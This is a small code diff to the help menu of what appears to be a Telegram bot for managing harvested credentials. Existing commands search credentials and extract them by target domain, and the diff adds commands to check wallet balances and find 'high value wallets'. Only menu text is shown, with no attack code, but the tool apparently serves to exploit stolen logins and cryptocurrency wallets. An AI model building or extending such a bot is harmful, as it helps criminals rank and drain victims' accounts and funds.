@@ -52,6 +52,9 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "/stats - Database analytics\n"
             "/recent - Recent activity (24h/7d/30d)\n"
             "/search - Search credentials\n"
+            "/wallets - Wallet statistics\n"
+            "/checkwallets - Check wallet balances\n"
+            "/highvalue - High value wallets\n"
             "/topdomains - View top domains\n"
             "/extractdomains - Extract credentials from target domains\n\n"
             
